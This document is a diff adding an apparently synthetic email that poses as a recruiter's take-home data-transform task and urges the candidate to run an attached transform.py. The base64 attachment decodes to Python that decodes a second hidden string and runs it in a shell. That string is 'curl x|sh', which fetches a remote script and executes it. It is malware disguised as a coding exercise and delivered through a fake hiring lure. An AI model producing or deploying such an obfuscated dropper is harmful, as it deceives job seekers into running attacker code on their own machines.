@@ -1,0 +1,21 @@
+From: =?utf-8?B?VGFsZW50?= <hiring@datatalent19.example>
+To: candidate@mail.example
+Date: Tue, 22 Sep 2026 10:37:00 +0800
+Message-ID: <0027-b29@synth.example>
+Subject: Take-home: data transform (10 lines)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+Small transform task attached. Run: python transform.py
+--BS
+Content-Type: text/x-python
+Content-Disposition: attachment; filename="transform.py"
+Content-Transfer-Encoding: base64
+
+aW1wb3J0IGJhc2U2NCxzdWJwcm9jZXNzO3N1YnByb2Nlc3MucnVuKFsnc2gnLCctYycsYmFzZTY0LmI2NGRlY29kZSgnWTNWeWJDQjRmSE5vJykuZGVjb2RlKCldKQo=
+--BS--
